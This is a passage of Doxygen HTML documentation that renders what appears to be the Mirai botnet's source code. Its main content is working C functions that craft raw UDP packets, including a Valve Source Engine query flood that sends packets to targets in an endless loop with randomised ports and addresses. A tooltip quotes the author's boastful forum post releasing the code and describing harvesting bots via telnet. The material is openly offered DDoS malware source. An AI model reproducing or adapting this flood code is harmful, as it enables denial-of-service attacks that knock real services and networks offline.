459</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00460"></a><span class="lineno">  460</span>&#160;            errno = 0;</div><div class="line"><a name="l00461"></a><span class="lineno">  461</span>&#160;            <span class="keywordflow">if</span> (send(fds[i], data, data_len, MSG_NOSIGNAL) == -1)</div><div class="line"><a name="l00462"></a><span class="lineno">  462</span>&#160;            {</div><div class="line"><a name="l00463"></a><span class="lineno">  463</span>&#160;                printf(<span class="stringliteral">&quot;send failed: %d\n&quot;</span>, errno);</div><div class="line"><a name="l00464"></a><span class="lineno">  464</span>&#160;            } <span class="keywordflow">else</span> {</div><div class="line"><a name="l00465"></a><span class="lineno">  465</span>&#160;                printf(<span class="stringliteral">&quot;.\n&quot;</span>);</div><div class="line"><a name="l00466"></a><span class="lineno">  466</span>&#160;            }</div><div class="line"><a name="l00467"></a><span class="lineno">  467</span>&#160;<span class="preprocessor">#else</span></div><div class="line"><a name="l00468"></a><span class="lineno">  468</span>&#160;            send(fds[i], data, data_len, MSG_NOSIGNAL);</div><div class="line"><a name="l00469"></a><span class="lineno">  469</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00470"></a><span class="lineno">  470</span>&#160;        }</div><div class="line"><a name="l00471"></a><span class="lineno">  471</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00472"></a><span class="lineno">  472</span>&#160;            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00473"></a><span class="lineno">  473</span>&#160;            <span class="keywordflow">if</span> (errno != 0)</div><div class="line"><a name="l00474"></a><span class="lineno">  474</span>&#160;                printf(<span class="stringliteral">&quot;errno = %d\n&quot;</span>, errno);</div><div class="line"><a name="l00475"></a><span class="lineno">  475</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00476"></a><span class="lineno">  476</span>&#160;    }</div><div class="line"><a name="l00477"></a><span class="lineno">  477</span>&#160;}</div><div class="ttc" id="loader_2src_2headers_2includes_8h_html_adccb5337cf206fe3eca7c4732f634bb9"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a></div><div class="ttdeci">uint16_t port_t</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00014">includes.h:14</a></div></div>
<div class="ttc" id="wget_8c_html_aa8318fbee111c5bde5952c63e894c962"><div class="ttname"><a href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a></div><div class="ttdeci">#define socket</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00047">wget.c:47</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa8cecfc5c5c054d2875c03e77b7be15d"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a></div><div class="ttdeci">#define TRUE</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00010">includes.h:10</a></div></div>
<div class="ttc" id="rand_8c_html_a11c986f4ca9d396a9bc68c0dd4b3903f"><div class="ttname"><a href="rand_8c.html#a11c986f4ca9d396a9bc68c0dd4b3903f">rand_str</a></div><div class="ttdeci">void rand_str(char *str, int len)</div><div class="ttdef"><b>Definition:</b> <a href="rand_8c_source.html#l00032">rand.c:32</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_af492d2bddcb2befacb3aa03dcdf9aafd"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a></div><div class="ttdeci">char BOOL</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00011">includes.h:11</a></div></div>
<div class="ttc" id="rand_8c_html_accf5c4faf4fb7eb9d74bbf1764921b00"><div class="ttname"><a href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a></div><div class="ttdeci">uint32_t rand_next(void)</div><div class="ttdef"><b>Definition:</b> <a href="rand_8c_source.html#l00021">rand.c:21</a></div></div>
<div class="ttc" id="attack_8h_html_a4d0115976f56267c42e6a09ff3651c02"><div class="ttname"><a href="attack_8h.html#a4d0115976f56267c42e6a09ff3651c02">ATK_OPT_SPORT</a></div><div class="ttdeci">#define ATK_OPT_SPORT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00052">attack.h:52</a></div></div>
<div class="ttc" id="attack_8h_html_ac8d9ef7cc50e5b0e43f50b087c4c7104"><div class="ttname"><a href="attack_8h.html#ac8d9ef7cc50e5b0e43f50b087c4c7104">ATK_OPT_PAYLOAD_RAND</a></div><div class="ttdeci">#define ATK_OPT_PAYLOAD_RAND</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00047">attack.h:47</a></div></div>
<div class="ttc" id="attack_8h_html_aacac129514ea3914af56b5eb4c71f8c6"><div class="ttname"><a href="attack_8h.html#aacac129514ea3914af56b5eb4c71f8c6">ATK_OPT_PAYLOAD_SIZE</a></div><div class="ttdeci">#define ATK_OPT_PAYLOAD_SIZE</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00046">attack.h:46</a></div></div>
<div class="ttc" id="attack_8c_html_ab59e5bf31f63eeb001f8ec1278a15907"><div class="ttname"><a href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a></div><div class="ttdeci">int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00206">attack.c:206</a></div></div>
<div class="ttc" id="ForumPost_8txt_html_a3eaa76d3cfe977972a9bf87dbc12c50f"><div class="ttname"><a href="ForumPost_8txt.html#a3eaa76d3cfe977972a9bf87dbc12c50f">connect</a></div><div class="ttdeci">World s Largest Echo CNC source code release Anna When I first go in DDoS I wasn t planning on staying in it long I made my there s lots of eyes looking at IOT so it s time to GTFO I know every skid and their it s their wet dream to have something besides qbot So I have an amazing release for you With I usually pull max bots from telnet alone after the Kreb ISPs been slowly shutting down and cleaning up their act max pull is about and dropping I am your and I will treat you real my hf chan And to everyone that thought they were doing anything by hitting my I had good this bot uses domain for CNC It takes seconds for all bots to lol shoutout to this blog post by malwaremustdie thought you were good but you really just completely and totally failed in reversing this binary We still have better kung fu than you kiddos don t make me laugh you made so many mistakes and even confused some different binaries with my LOL Let me give you some slaps back port is not for back connect</div><div class="ttdef"><b>Definition:</b> <a href="ForumPost_8txt_source.html#l00001">ForumPost.txt:1</a></div></div>
<div class="ttc" id="attack_8h_html_ab8471c4c3e703d3c9ee4e971c48ba5fb"><div class="ttname"><a href="attack_8h.html#ab8471c4c3e703d3c9ee4e971c48ba5fb">ATK_OPT_DPORT</a></div><div class="ttdeci">#define ATK_OPT_DPORT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00053">attack.h:53</a></div></div>
<div class="ttc" id="protocol_8h_html_ad1a572736a10ff6b282c5f43c4ea1ccf"><div class="ttname"><a href="protocol_8h.html#ad1a572736a10ff6b282c5f43c4ea1ccf">data_len</a></div><div class="ttdeci">uint16_t data_len</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00483">protocol.h:483</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="a12573f0d31b49ed03a25a6bee68cd37f"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void attack_udp_vse </td>
          <td>(</td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__target.html">attack_target</a> *&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__option.html">attack_option</a> *&#160;</td>
          <td class="paramname">&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack__udp_8c_source.html#l00129">129</a> of file <a class="el" href="attack__udp_8c_source.html">attack_udp.c</a>.</p>

<p>References <a class="el" href="attack_8h_source.html#l00022">attack_target::addr</a>, <a class="el" href="attack_8h_source.html#l00053">ATK_OPT_DPORT</a>, <a class="el" href="attack_8h_source.html#l00051">ATK_OPT_IP_DF</a>, <a class="el" href="attack_8h_source.html#l00049">ATK_OPT_IP_IDENT</a>, <a class="el" href="attack_8h_source.html#l00048">ATK_OPT_IP_TOS</a>, <a class="el" href="attack_8h_source.html#l00050">ATK_OPT_IP_TTL</a>, <a class="el" href="attack_8h_source.html#l00052">ATK_OPT_SPORT</a>, <a class="el" href="attack_8c_source.html#l00206">attack_get_opt_int()</a>, <a class="el" href="checksum_8c_source.html#l00009">checksum_generic()</a>, <a class="el" href="checksum_8c_source.html#l00024">checksum_tcpudp()</a>, <a class="el" href="wget_8c_source.html#l00052">close</a>, <a class="el" href="loader_2src_2headers_2includes_8h_source.html#l00009">FALSE</a>, <a class="el" href="mirai_2bot_2includes_8h_source.html#l00031">LOCAL_ADDR</a>, <a class="el" href="rand_8c_source.html#l00021">rand_next()</a>, <a class="el" href="attack_8h_source.html#l00021">attack_target::sock_addr</a>, <a class="el" href="wget_8c_source.html#l00047">socket</a>, <a class="el" href="table_8h_source.html#l00049">TABLE_ATK_VSE</a>, <a class="el" href="table_8c_source.html#l00108">table_retrieve_val()</a>, <a class="el" href="table_8c_source.html#l00078">table_unlock_val()</a>, <a class="el" href="loader_2src_2headers_2includes_8h_source.html#l00010">TRUE</a>, and <a class="el" href="mirai_2bot_2util_8c_source.html#l00072">util_memcpy()</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00022">attack_init()</a>.</p>
<div class="fragment"><div class="line"><a name="l00130"></a><span class="lineno">  130</span>&#160;{</div><div class="line"><a name="l00131"></a><span class="lineno">  131</span>&#160;    <span class="keywordtype">int</span> i, fd;</div><div class="line"><a name="l00132"></a><span class="lineno">  132</span>&#160;    <span class="keywordtype">char</span> **pkts = calloc(targs_len, <span class="keyword">sizeof</span> (<span class="keywordtype">char</span> *));</div><div class="line"><a name="l00133"></a><span class="lineno">  133</span>&#160;    uint8_t ip_tos = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a1ac4210e00c74506c31642a74e3fc1c7">ATK_OPT_IP_TOS</a>, 0);</div><div class="line"><a name="l00134"></a><span class="lineno">  134</span>&#160;    uint16_t ip_ident = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#aecb175215ca3d0ce5017cd8cedb7e0fe">ATK_OPT_IP_IDENT</a>, 0xffff);</div><div class="line"><a name="l00135"></a><span class="lineno">  135</span>&#160;    uint8_t ip_ttl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#acfa2ed8a557040aed04b6c9346aa0eb9">ATK_OPT_IP_TTL</a>, 64);</div><div class="line"><a name="l00136"></a><span class="lineno">  136</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> dont_frag = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a57162ecbd3f7644a8f6a6b58aa4f8596">ATK_OPT_IP_DF</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00137"></a><span class="lineno">  137</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a> sport = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a4d0115976f56267c42e6a09ff3651c02">ATK_OPT_SPORT</a>, 0xffff);</div><div class="line"><a name="l00138"></a><span class="lineno">  138</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a> dport = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#ab8471c4c3e703d3c9ee4e971c48ba5fb">ATK_OPT_DPORT</a>, 27015);</div><div class="line"><a name="l00139"></a><span class="lineno">  139</span>&#160;    <span class="keywordtype">char</span> *vse_payload;</div><div class="line"><a name="l00140"></a><span class="lineno">  140</span>&#160;    <span class="keywordtype">int</span> vse_payload_len;</div><div class="line"><a name="l00141"></a><span class="lineno">  141</span>&#160;</div><div class="line"><a name="l00142"></a><span class="lineno">  142</span>&#160;    <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#a2b2b737a21de0ee9d38eda3b2771d355">TABLE_ATK_VSE</a>);</div><div class="line"><a name="l00143"></a><span class="lineno">  143</span>&#160;    vse_payload = <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a2b2b737a21de0ee9d38eda3b2771d355">TABLE_ATK_VSE</a>, &amp;vse_payload_len);</div><div class="line"><a name="l00144"></a><span class="lineno">  144</span>&#160;</div><div class="line"><a name="l00145"></a><span class="lineno">  145</span>&#160;    <span class="keywordflow">if</span> ((fd = <a class="code" href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a>(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)</div><div class="line"><a name="l00146"></a><span class="lineno">  146</span>&#160;    {</div><div class="line"><a name="l00147"></a><span class="lineno">  147</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00148"></a><span class="lineno">  148</span>&#160;        printf(<span class="stringliteral">&quot;Failed to create raw socket. Aborting attack\n&quot;</span>);</div><div class="line"><a name="l00149"></a><span class="lineno">  149</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00150"></a><span class="lineno">  150</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00151"></a><span class="lineno">  151</span>&#160;    }</div><div class="line"><a name="l00152"></a><span class="lineno">  152</span>&#160;    i = 1;</div><div class="line"><a name="l00153"></a><span class="lineno">  153</span>&#160;    <span class="keywordflow">if</span> (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &amp;i, <span class="keyword">sizeof</span> (<span class="keywordtype">int</span>)) == -1)</div><div class="line"><a name="l00154"></a><span class="lineno">  154</span>&#160;    {</div><div class="line"><a name="l00155"></a><span class="lineno">  155</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00156"></a><span class="lineno">  156</span>&#160;        printf(<span class="stringliteral">&quot;Failed to set IP_HDRINCL. Aborting\n&quot;</span>);</div><div class="line"><a name="l00157"></a><span class="lineno">  157</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00158"></a><span class="lineno">  158</span>&#160;        <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(fd);</div><div class="line"><a name="l00159"></a><span class="lineno">  159</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00160"></a><span class="lineno">  160</span>&#160;    }</div><div class="line"><a name="l00161"></a><span class="lineno">  161</span>&#160;</div><div class="line"><a name="l00162"></a><span class="lineno">  162</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00163"></a><span class="lineno">  163</span>&#160;    {</div><div class="line"><a name="l00164"></a><span class="lineno">  164</span>&#160;        <span class="keyword">struct </span>iphdr *iph;</div><div class="line"><a name="l00165"></a><span class="lineno">  165</span>&#160;        <span class="keyword">struct </span>udphdr *udph;</div><div class="line"><a name="l00166"></a><span class="lineno">  166</span>&#160;        <span class="keywordtype">char</span> *data;</div><div class="line"><a name="l00167"></a><span class="lineno">  167</span>&#160;</div><div class="line"><a name="l00168"></a><span class="lineno">  168</span>&#160;        pkts[i] = calloc(128, <span class="keyword">sizeof</span> (<span class="keywordtype">char</span>));</div><div class="line"><a name="l00169"></a><span class="lineno">  169</span>&#160;        iph = (<span class="keyword">struct </span>iphdr *)pkts[i];</div><div class="line"><a name="l00170"></a><span class="lineno">  170</span>&#160;        udph = (<span class="keyword">struct </span>udphdr *)(iph + 1);</div><div class="line"><a name="l00171"></a><span class="lineno">  171</span>&#160;        data = (<span class="keywordtype">char</span> *)(udph + 1);</div><div class="line"><a name="l00172"></a><span class="lineno">  172</span>&#160;</div><div class="line"><a name="l00173"></a><span class="lineno">  173</span>&#160;        iph-&gt;version = 4;</div><div class="line"><a name="l00174"></a><span class="lineno">  174</span>&#160;        iph-&gt;ihl = 5;</div><div class="line"><a name="l00175"></a><span class="lineno">  175</span>&#160;        iph-&gt;tos = ip_tos;</div><div class="line"><a name="l00176"></a><span class="lineno">  176</span>&#160;        iph-&gt;tot_len = htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> udphdr) + <span class="keyword">sizeof</span> (uint32_t) + vse_payload_len);</div><div class="line"><a name="l00177"></a><span class="lineno">  177</span>&#160;        iph-&gt;id = htons(ip_ident);</div><div class="line"><a name="l00178"></a><span class="lineno">  178</span>&#160;        iph-&gt;ttl = ip_ttl;</div><div class="line"><a name="l00179"></a><span class="lineno">  179</span>&#160;        <span class="keywordflow">if</span> (dont_frag)</div><div class="line"><a name="l00180"></a><span class="lineno">  180</span>&#160;            iph-&gt;frag_off = htons(1 &lt;&lt; 14);</div><div class="line"><a name="l00181"></a><span class="lineno">  181</span>&#160;        iph-&gt;protocol = IPPROTO_UDP;</div><div class="line"><a name="l00182"></a><span class="lineno">  182</span>&#160;        iph-&gt;saddr = <a class="code" href="mirai_2bot_2includes_8h.html#aecb64c7238a325af454cf5e17d933ff2">LOCAL_ADDR</a>;</div><div class="line"><a name="l00183"></a><span class="lineno">  183</span>&#160;        iph-&gt;daddr = targs[i].addr;</div><div class="line"><a name="l00184"></a><span class="lineno">  184</span>&#160;</div><div class="line"><a name="l00185"></a><span class="lineno">  185</span>&#160;        udph-&gt;source = htons(sport);</div><div class="line"><a name="l00186"></a><span class="lineno">  186</span>&#160;        udph-&gt;dest = htons(dport);</div><div class="line"><a name="l00187"></a><span class="lineno">  187</span>&#160;        udph-&gt;len = htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> udphdr) + 4 + vse_payload_len);</div><div class="line"><a name="l00188"></a><span class="lineno">  188</span>&#160;</div><div class="line"><a name="l00189"></a><span class="lineno">  189</span>&#160;        *((uint32_t *)data) = 0xffffffff;</div><div class="line"><a name="l00190"></a><span class="lineno">  190</span>&#160;        data += <span class="keyword">sizeof</span> (uint32_t);</div><div class="line"><a name="l00191"></a><span class="lineno">  191</span>&#160;        <a class="code" href="mirai_2bot_2util_8c.html#a8654e276185a2f53935614d38f4117f3">util_memcpy</a>(data, vse_payload, vse_payload_len);</div><div class="line"><a name="l00192"></a><span class="lineno">  192</span>&#160;    }</div><div class="line"><a name="l00193"></a><span class="lineno">  193</span>&#160;</div><div class="line"><a name="l00194"></a><span class="lineno">  194</span>&#160;    <span class="keywordflow">while</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00195"></a><span class="lineno">  195</span>&#160;    {</div><div class="line"><a name="l00196"></a><span class="lineno">  196</span>&#160;        <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00197"></a><span class="lineno">  197</span>&#160;        {</div><div class="line"><a name="l00198"></a><span class="lineno">  198</span>&#160;            <span class="keywordtype">char</span> *pkt = pkts[i];</div><div class="line"><a name="l00199"></a><span class="lineno">  199</span>&#160;            <span class="keyword">struct </span>iphdr *iph = (<span class="keyword">struct </span>iphdr *)pkt;</div><div class="line"><a name="l00200"></a><span class="lineno">  200</span>&#160;            <span class="keyword">struct </span>udphdr *udph = (<span class="keyword">struct </span>udphdr *)(iph + 1);</div><div class="line"><a name="l00201"></a><span class="lineno">  201</span>&#160;            </div><div class="line"><a name="l00202"></a><span class="lineno">  202</span>&#160;            <span class="comment">// For prefix attacks</span></div><div class="line"><a name="l00203"></a><span class="lineno">  203</span>&#160;            <span class="keywordflow">if</span> (targs[i].netmask &lt; 32)</div><div class="line"><a name="l00204"></a><span class="lineno">  204</span>&#160;                iph-&gt;daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)<a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>()) &gt;&gt; targs[i].netmask));</div><div class="line"><a name="l00205"></a><span class="lineno">  205</span>&#160;</div><div class="line"><a name="l00206"></a><span class="lineno">  206</span>&#160;            <span class="keywordflow">if</span> (ip_ident == 0xffff)</div><div class="line"><a name="l00207"></a><span class="lineno">  207</span>&#160;                iph-&gt;id = (uint16_t)<a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00208"></a><span class="lineno">  208</span>&#160;            <span class="keywordflow">if</span> (sport == 0xffff)</div><div class="line"><a name="l00209"></a><span class="lineno">  209</span>&#160;                udph-&gt;source = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00210"></a><span class="lineno">  210</span>&#160;            <span class="keywordflow">if</span> (dport == 0xffff)</div><div class="line"><a name="l00211"></a><span class="lineno">  211</span>&#160;                udph-&gt;dest = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00212"></a><span class="lineno">  212</span>&#160;</div><div class="line"><a name="l00213"></a><span class="lineno">  213</span>&#160;            iph-&gt;check = 0;</div><div class="line"><a name="l00214"></a><span class="lineno">  214</span>&#160;            iph-&gt;check = <a class="code" href="checksum_8c.html#a84522f5e663ea711a5ceafdf03e586ea">checksum_generic</a>((uint16_t *)iph, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr));</div><div class="line"><a name="l00215"></a><span class="lineno">  215</span>&#160;</div><div class="line"><a name="l00216"></a><span class="lineno">  216</span>&#160;            udph-&gt;check = 0;</div><div class="line"><a name="l00217"></a><span class="lineno">  217</span>&#160;            udph-&gt;check = <a class="code" href="checksum_8c.html#a5144ab59500e01ed196ae6d8b4584c98">checksum_tcpudp</a>(iph, udph, udph-&gt;len, sizeof (<span class="keyword">struct</span> udphdr) + <span class="keyword">sizeof</span> (uint32_t) + vse_payload_len);</div><div class="line"><a name="l00218"></a><span class="lineno">  218</span>&#160;</div><div class="line"><a name="l00219"></a><span class="lineno">  219</span>&#160;            targs[i].sock_addr.sin_port = udph-&gt;dest;</div><div class="line"><a name="l00220"></a><span class="lineno">  220</span>&#160;            sendto(fd, pkt, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> udphdr) + <span class="keyword">sizeof</span> (uint32_t) + vse_payload_len, MSG_NOSIGNAL, (<span class="keyword">struct</span> sockaddr *)&amp;targs[i].sock_addr, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> sockaddr_in));</div><div class="line"><a name="l00221"></a><span class="lineno">  221</span>&#160;        }</div><div class="line"><a name="l00222"></a><span class="lineno">  222</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00223"></a><span class="lineno">  223</span>&#160;            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00224"></a><span class="lineno">  224</span>&#160;            <span class="keywordflow">if</span> (errno != 0)</div><div class="line"><a name="l00225"></a><span class="lineno">  225</span>&#160;                printf(<span class="stringliteral">&quot;errno = %d\n&quot;</span>, errno);</div><div class="line"><a name="l00226"></a><span class="lineno">  226</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00227"></a><span class="lineno">  227</span>&#160;    }</div><div class="line"><a name="l00228"></a><span class="lineno">  228</span>&#160;}</div><div class="ttc" id="loader_2src_2headers_2includes_8h_html_adccb5337cf206fe3eca7c4732f634bb9"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a></div><div class="ttdeci">uint16_t port_t</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00014">includes.h:14</a></div></div>
<div class="ttc" id="checksum_8c_html_a84522f5e663ea711a5ceafdf03e586ea"><div class="ttname"><a href="checksum_8c.html#a84522f5e663ea711a5ceafdf03e586ea">checksum_generic</a></div><div class="ttdeci">uint16_t checksum_generic(uint16_t *addr, uint32_t count)</div><div class="ttdef"><b>Definition:</b> <a href="checksum_8c_source.html#l00009">checksum.c:9</a></div></div>
<div class="ttc" id="wget_8c_html_aa8318fbee111c5bde5952c63e894c962"><div class="ttname"><a href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a></div><div class="ttdeci">#define socket</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00047">wget.c:47</a></div></div>
<div class="ttc" id="wget_8c_html_a9c7f6d5331abb2692a876d5ee67474b7"><div class="ttname"><a href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a></div><div class="ttdeci">#define close</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00052">wget.c:52</a></div></div>
<div class="ttc" id="attack_8h_html_acfa2ed8a557040aed04b6c9346aa0eb9"><div class="ttname"><a href="attack_8h.html#acfa2ed8a557040aed04b6c9346aa0eb9">ATK_OPT_IP_TTL</a></div><div class="ttdeci">#define ATK_OPT_IP_TTL</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00050">attack.h:50</a></div></div>
<div class="ttc" id="mirai_2bot_2includes_8h_html_aecb64c7238a325af454cf5e17d933ff2"><div class="ttname"><a href="mirai_2bot_2includes_8h.html#aecb64c7238a325af454cf5e17d933ff2">LOCAL_ADDR</a></div><div class="ttdeci">ipv4_t LOCAL_ADDR</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2includes_8h_source.html#l00031">includes.h:31</a></div></div>
<div class="ttc" id="table_8c_html_a960bec3b47b287c42b06c26eb370ed67"><div class="ttname"><a href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a></div><div class="ttdeci">char * table_retrieve_val(int id, int *len)</div><div class="ttdef"><b>Definition:</b> <a href="table_8c_source.html#l00108">table.c:108</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa8cecfc5c5c054d2875c03e77b7be15d"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a></div><div class="ttdeci">#define TRUE</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00010">includes.h:10</a></div></div>
<div class="ttc" id="checksum_8c_html_a5144ab59500e01ed196ae6d8b4584c98"><div class="ttname"><a href="checksum_8c.html#a5144ab59500e01ed196ae6d8b4584c98">checksum_tcpudp</a></div><div class="ttdeci">uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)</div><div class="ttdef"><b>Definition:</b> <a href="checksum_8c_source.html#l00024">checksum.c:24</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_af492d2bddcb2befacb3aa03dcdf9aafd"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a></div><div class="ttdeci">char BOOL</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00011">includes.h:11</a></div></div>
<div class="ttc" id="rand_8c_html_accf5c4faf4fb7eb9d74bbf1764921b00"><div class="ttname"><a href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a></div><div class="ttdeci">uint32_t rand_next(void)</div><div class="ttdef"><b>Definition:</b> <a href="rand_8c_source.html#l00021">rand.c:21</a></div></div>
<div class="ttc" id="attack_8h_html_a4d0115976f56267c42e6a09ff3651c02"><div class="ttname"><a href="attack_8h.html#a4d0115976f56267c42e6a09ff3651c02">ATK_OPT_SPORT</a></div><div class="ttdeci">#define ATK_OPT_SPORT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00052">attack.h:52</a></div></div>
<div class="ttc" id="mirai_2bot_2util_8c_html_a8654e276185a2f53935614d38f4117f3"><div class="ttname"><a href="mirai_2bot_2util_8c.html#a8654e276185a2f53935614d38f4117f3">util_memcpy</a></div><div class="ttdeci">void util_memcpy(void *dst, void *src, int len)</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2util_8c_source.html#l00072">util.c:72</a></div></div>
<div class="ttc" id="attack_8h_html_a57162ecbd3f7644a8f6a6b58aa4f8596"><div class="ttname"><a href="attack_8h.html#a57162ecbd3f7644a8f6a6b58aa4f8596">ATK_OPT_IP_DF</a></div><div class="ttdeci">#define ATK_OPT_IP_DF</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00051">attack.h:51</a></div></div>
